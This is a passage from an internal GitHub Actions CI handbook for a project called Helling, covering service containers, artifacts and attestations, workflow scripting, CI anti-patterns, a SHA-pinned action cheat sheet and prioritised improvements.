### 7.2 Service containers - when you hit DB tests

The moment Helling has integration tests that need Postgres:

```yaml
jobs:
  integration:
    runs-on: ubuntu-24.04
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: ./.github/actions/setup-go-env
      - run: go test -tags=integration ./...
        env:
          DATABASE_URL: postgres://postgres:postgres@localhost:5432/postgres
```

Semantics:

- The service container starts _before_ your steps run.
- GitHub waits for the `health-cmd` to succeed before moving on.
- The service is reachable at `localhost:<port>` because it's port-forwarded to the job's network namespace.
- Services are reaped when the job ends.

**Alternative: `container:` for the entire job.** The whole job runs inside a Docker container:

```yaml
jobs:
  build:
    runs-on: ubuntu-24.04
    container:
      image: golang:1.26-bookworm
    services:
      postgres:
        image: postgres:16
```

When you use `container:`, services are reachable by **service name** (`postgres`, `redis`) rather than `localhost`, because they share the same Docker network. This is a common gotcha when migrating from `runs-on:` bare to `container:`.

**When to use `container:`:**

- You need a specific glibc / libc / system library baseline.
- Your tests need a customised environment and you don't want to install it every run.

**When to avoid:** most CI jobs. Docker-in-Docker interactions get weird, and the GH-hosted VM already has a good toolchain.

### 7.3 Custom runner images - skip

You asked to skip self-hosting. Custom runner images are a self-hosted concept (or a "larger runner" concept that's paid even on public repos). Ignore for Helling.

---

## 8. Artifacts, attestations, scripts

### 8.1 Artifacts vs caches

| Feature          | Artifact                                                    | Cache                                            |
| ---------------- | ----------------------------------------------------------- | ------------------------------------------------ |
| Purpose          | Pass data between jobs in a run, or out of a run for humans | Speed up future runs by persisting dep downloads |
| Lifetime         | 90 days default (configurable)                              | 7 days from last access                          |
| Size             | 10 GB per artifact; 20 GB per run free                      | 10 GB per repo total                             |
| Key              | Name                                                        | Key string                                       |
| Visible in UI    | Yes - downloadable                                          | No - opaque to UI                                |
| Typical contents | Binaries, SBOMs, coverage, test reports                     | `~/.cache/go-build`, `node_modules`, etc.        |

Rule: if a human will want to look at it, it's an artifact. If only the CI wants it, it's a cache.

### 8.2 Build provenance attestations - defer until release

`actions/attest-build-provenance@v4.1.0` creates SLSA-level build attestations signed with Sigstore. The output is a signed JSON bundle proving "this binary came from that repo at that commit via that workflow." Useful for consumers of your released binaries.

**When to add for Helling:** the first time you publish a release (binary, container image, or Helm chart that downstreams install). Not before. The attestation is meaningless without release artifacts to attest to.

Shape when you're ready:

```yaml
jobs:
  release:
    permissions:
      id-token: write # for Sigstore
      attestations: write # for the attestation API
      contents: write # for the release itself
    steps:
      - uses: actions/checkout@...
      - run: make build-release # produces dist/helling
      - uses: actions/attest-build-provenance@a2bbfa25375fe432b6a289bc6b6cd05ecd0c4c32 # v4.1.0
        with:
          subject-path: dist/helling
      - uses: actions/attest-sbom@c604332985a26aa8cf1bdc465b92731239ec6b9e # v4.1.0
        with:
          subject-path: dist/helling
          sbom-path: dist/sbom.spdx.json
```

Companion: `actions/attest-sbom@v4.1.0` attaches an SBOM to the attestation.

### 8.3 Scripts in workflows

Three styles, picking the right one matters:

1. **Inline `run:`**. Fine for 1-5 line scripts. Anything longer becomes unreadable.
2. **Committed scripts in `scripts/`**. `run: bash scripts/check-parity.sh`. Helling already uses this pattern for `check-coverage.sh` and `check-parity.sh` - correct.
3. **Composite action with internal script**. When the script + its setup is repeated across jobs.

**Rules:**

- `shell: bash` by default on Linux/macOS, `shell: pwsh` on Windows.
- Always `set -euo pipefail` at the top of bash scripts in CI. Unset variables and pipeline failures will silently pass otherwise.
- `run:` lines are run through `bash -e {0}` (fail on any non-zero exit). Inline `|` multiline blocks run the whole block as a single shell invocation - not as individual commands.

**Trap:** trailing `\` line continuations with comments:

```bash
curl -fsSL https://... \  # THIS BREAKS - comment after \ does not work
  -o /tmp/thing
```

### 8.4 Workflow commands

The runner understands `::command::value` lines in step output:

| Command                          | Purpose                                                  |
| -------------------------------- | -------------------------------------------------------- |
| `::notice title=X::message`      | Creates a notice annotation on the run                   |
| `::warning::message`             | Creates a warning annotation                             |
| `::error::message`               | Creates an error annotation (job fails if inside `run:`) |
| `::group::name` / `::endgroup::` | Collapses log lines in the UI                            |
| `::add-mask::value`              | Masks `value` in subsequent logs                         |
| `::debug::message`               | Visible only when `ACTIONS_STEP_DEBUG=true`              |

Helling's `quality.yml` uses `::error::` correctly for the OpenAPI score gate. Good.

`::group::` is underused in Helling. Useful when a `run:` step emits >50 lines and you want to collapse it in the UI:

```bash
echo "::group::Running tests"
go test ./...
echo "::endgroup::"
```

---

## 9. Anti-patterns gallery

Common shapes you should not adopt:

### 9.1 `uses: x/y@main`

Floating tag. Breaks ADR-026. SHA-pin.

### 9.2 `version: latest`

Same problem, one level down. You had this in `golangci-lint-action`. Fixed.

### 9.3 Matrix of tasks

```yaml
strategy:
  matrix:
    task: [build, test, lint]
```

Use jobs, not matrix. A matrix is for _variation of inputs_, not for sequencing different things.

### 9.4 Long `run:` block with no `set -e`

```yaml
- run: |
    curl http://fragile.api/endpoint
    process_results
    publish_to_registry
```

Without `set -euo pipefail`, a failed curl silently moves to `process_results`, which publishes garbage to production.

### 9.5 `needs:` chain that serialises everything

```yaml
jobs:
  checkout: ...
  build: { needs: checkout }
  test: { needs: build }
  lint: { needs: test }
```

Independent things should run in parallel. Use `needs:` only when B genuinely requires A's _outputs_ or _artifacts_, not because it "feels orderly."

### 9.6 Re-implementing what setup-X provides

`actions/setup-go` already caches `$GOCACHE` and `$GOMODCACHE` when `cache: true`. Don't add a second `actions/cache` block for the same paths - you'll clobber.

### 9.7 Secrets in workflow file names or default values

Never:

```yaml
on:
  workflow_dispatch:
    inputs:
      token:
        default: ${{ secrets.DEPLOY_TOKEN }} # leaks into event payload
```

Use `env:` inside the job.

### 9.8 `continue-on-error: true` as a way to hide flakiness

If a step is flaky, fix it. `continue-on-error` converts failure into a warning, which nobody reads, and the problem festers.

### 9.9 Fan-out matrix without a consolidator job

If you run 20 matrix jobs and one fails, your branch protection sees "20 checks, 1 failed." Better: a single `ci-complete` job that `needs:` the matrix and reports one summary status (Section 2.3).

### 9.10 Caching build outputs as artifacts

Artifacts are expensive and visible in the UI. Caching is cheap and invisible. Use each for its purpose.

---

## 10. Deprioritized topics (you asked, here's why I'm skipping)

### 10.1 Issue labelers, inactive-issue bots, PR-comment-on-label

Valuable at scale (1000+ issues/PRs). Helling has neither. Revisit when the project has multiple active contributors generating more issues than you can triage manually.

### 10.2 Custom deployment protection rules

Requires a deployment pipeline with `environment:` blocks. Helling doesn't deploy anything from CI yet. Revisit when the Helling platform has releases that auto-deploy to a staging environment.

### 10.3 Docker service containers (deeper than Section 7.2)

Section 7.2 covers the useful 90%. The remaining complexity (custom networks, multi-service orchestration with dependencies between services) is rarely worth it in CI - if your test setup is that elaborate, run it in a proper test environment, not a CI runner.

### 10.4 Continuous deployment scaffolding

Once you have releases to deploy, the patterns are: (1) `environment:` with approvers and branch gate, (2) OIDC to cloud, (3) signed artifacts with `attest-build-provenance`, (4) separate deploy workflow triggered on `workflow_run` of a release workflow. Out of scope for today.

### 10.5 Communicating with Docker service containers

This is mostly "know that services are reachable by name under `container:` and by `localhost:PORT` under `runs-on:`" (Section 7.2). The rest is networking basics.

### 10.6 Configuring custom deployment protection rules

App-based gating on deploys. Needs a deployment pipeline first.

### 10.7 Third-party CLI action, metadata syntax reference

"Third-party CLI action" is just any action you didn't write - vetting covered in Section 3.3. "Metadata syntax reference" is the `action.yml` spec; reference [GitHub's docs](https://docs.github.com/en/actions/reference/metadata-syntax-for-github-actions) when you write your own action, not before.

---

## 11. Reference - cheat sheet

### 11.1 The "start here" workflow template

```yaml
name: <Name>

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  job-name:
    name: <Human-readable>
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
      - uses: actions/cache@27d5ce7f107fe9357f9df03efb73ab90386fccae # v5.0.5
        with:
          path: ~/.cache/<tool>
          key: ${{ runner.os }}-<tool>-${{ hashFiles('<lockfile>') }}
          restore-keys: ${{ runner.os }}-<tool>-
      - name: Do thing
        env:
          USER_INPUT: ${{ github.event.pull_request.title }}
        run: |
          set -euo pipefail
          echo "Title: $USER_INPUT"
```

### 11.2 Latest-known pins (2026-04-21)

| Action                            | Version | SHA                                        |
| --------------------------------- | ------- | ------------------------------------------ |
| `actions/checkout`                | v6.0.2  | `de0fac2e4500dabe0009e67214ff5f5447ce83dd` |
| `actions/setup-go`                | v6.3.0  | `4b73464bb391d4059bd26b0524d20df3927bd417` |
| `actions/setup-node`              | v6.3.0  | `53b83947a5a98c8d113130e565377fae1a50d02f` |
| `actions/setup-python`            | v6.2.0  | `a309ff8b426b58ec0e2a45f0f869d46889d02405` |
| `actions/cache`                   | v5.0.5  | `27d5ce7f107fe9357f9df03efb73ab90386fccae` |
| `actions/upload-artifact`         | v7.0.0  | `bbbca2ddaa5d8feaa63e36b76fdaad77386f024f` |
| `actions/attest-build-provenance` | v4.1.0  | `a2bbfa25375fe432b6a289bc6b6cd05ecd0c4c32` |
| `actions/attest-sbom`             | v4.1.0  | `c604332985a26aa8cf1bdc465b92731239ec6b9e` |
| `dorny/paths-filter`              | v4.0.1  | `fbd0ab8f3e69293af611ebaee6363fc25e6d187d` |
| `github/codeql-action`            | v4.35.2 | `95e58e9a2cdfd71adc6e0353d5c52f41a045d225` |

Keep this table current with dependabot auto-bumps.

### 11.3 Expression quick reference

```yaml
# Event-based conditions
if: github.event_name == 'pull_request'
if: github.event_name == 'push' && github.ref == 'refs/heads/main'
if: startsWith(github.ref, 'refs/tags/v')
if: contains(github.event.pull_request.labels.*.name, 'skip-ci')

# Bot filtering
if: github.actor != 'dependabot[bot]'
if: github.event.pull_request.user.login != 'dependabot[bot]'

# Run on success/failure
if: success()
if: failure()
if: always()
if: ${{ !cancelled() }}
if: ${{ failure() && !cancelled() }}

# Cross-job conditionals
if: needs.changes.outputs.go == 'true'

# Step output references
${{ steps.<id>.outputs.<name> }}
${{ steps.<id>.conclusion == 'success' }}

# String manipulation
${{ format('v{0}.{1}', matrix.major, matrix.minor) }}
${{ join(matrix.tags, ',') }}

# JSON
${{ toJSON(github.event) }}          # object -> JSON string
${{ fromJSON(env.MATRIX) }}           # JSON string -> object
```

### 11.4 Priority order for Helling (what to do first)

1. **Add `timeout-minutes` to every job.** 2 minutes of work, eliminates the 6-hour runaway risk. Do this in the next PR.
2. **Add path filters** via `dorny/paths-filter` + a consolidator `ci-complete` job. Biggest single wall-clock win for typical PRs. ~1 hour of work.
3. **Composite action for `actions/checkout + actions/setup-go + Go bin cache`.** Removes 10 copies of the same sequence, enables the Go bin cache. ~1 hour of work. Measure the `go` job before and after.
4. **Cache pip/pipx, npm global, sqlc binary, vacuum binary.** Individual small wins, ~30 min of work total.
5. **Audit permissions** - remove `pull-requests: read` where not needed. ~10 minutes.

Everything else in this doc is context or later-revisit material.

---

## 12. Tracking & revisit triggers

When any of these happen, come back to this doc:

| Trigger                                                  | Revisit section(s)               |
| -------------------------------------------------------- | -------------------------------- |
| You add Postgres integration tests                       | Section 7.2 (service containers) |
| You ship the first Helling release binary                | Section 8.2 (attestations)       |
| CI average wall-clock time exceeds 5 min                 | Section 2 (all of it)            |
| A third-party action you depend on gets compromised      | Section 3.3, Section 3.4         |
| You hit >20 concurrent jobs and queueing becomes painful | Section 5.3 + evaluate ARC       |
| You start running identical CI across multiple repos     | Section 4.1 (reusable workflows) |
| A workflow needs to call another workflow                | Section 4.1 + `workflow_call`    |
| You want fork PRs to run CI with secrets                 | Section 3.2 - and please don't   |

---

_End of handbook. This document is intended to live at `docs/ci-reference.md` in the Helling repo._
